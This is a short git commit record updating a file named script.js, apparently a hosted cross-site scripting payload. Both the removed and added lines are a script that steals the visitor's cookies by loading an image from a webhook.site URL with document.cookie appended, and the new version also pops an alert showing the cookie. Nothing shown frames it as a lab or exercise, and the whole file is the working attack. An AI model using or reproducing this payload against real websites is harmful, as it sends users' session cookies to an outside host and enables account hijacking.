15f84deebbc3ce54be14c34c16c165a75def845e
pinyoko573 <87714995+pinyoko573@users.noreply.github.com>
2024-02-17 10:55:41 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,5 @@
-<script>var i=new Image;i.src="https://webhook.site/5e261809-ed5e-4a56-8fec-8befa1b88c03/?"+document.cookie;</script>
+<script>
+alert(document.cookie);
+var i=new Image;
+i.src="http://webhook.site/5e261809-ed5e-4a56-8fec-8befa1b88c03/?"+document.cookie;
+</script>
